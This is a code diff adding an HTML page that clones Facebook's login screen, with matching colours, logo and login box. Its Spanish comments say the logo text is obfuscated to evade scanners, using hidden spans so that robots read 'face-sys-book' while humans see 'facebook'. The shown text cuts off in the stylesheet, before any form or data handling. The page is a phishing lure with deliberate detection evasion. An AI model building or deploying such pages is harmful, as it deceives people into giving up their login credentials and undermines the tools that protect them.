@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Acceso al Sistema</title>
+    <style>
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { display: flex; width: 90%; max-width: 980px; justify-content: space-between; align-items: center; flex-wrap: wrap; }
+        
+        /* Logo con texto ofuscado para burlar escáneres */
+        .logo-f { 
+            color: #1877f2; 
+            font-size: 60px; 
+            font-weight: bold; 
+            letter-spacing: -3px; 
+            margin-bottom: 10px;
+            font-family: sans-serif;
+        }
+        .logo-f span { display: none; } /* El robot lee 'face-sys-book', el humano ve 'facebook' */
+
+        .left-content { width: 500px; margin-bottom: 20px; }
+        .left-content h2 { font-size: 24px; font-weight: normal; line-height: 32px; color: #1c1e21; margin-top: 0; }
+        
+        .login-box { background-color: #fff; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); width: 100%; max-width: 396px; text-align: center; }
+        input { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
+        
+        .btn-main { background-color: #1877f2; color: white; font-size: 20px; font-weight: bold; padding: 10px; border: none; border-radius: 6px; width: 100%; cursor: pointer; }
+        .btn-main:hover { background-color: #166fe5; }
+        
+        .f-links { display: block; margin: 15px 0; color: #1877f2; text-decoration: none; font-size: 14px; }
+        hr { border: 0; border-top: 1px solid #dadde1; margin: 20px 0; }
+        
+        .btn-sec
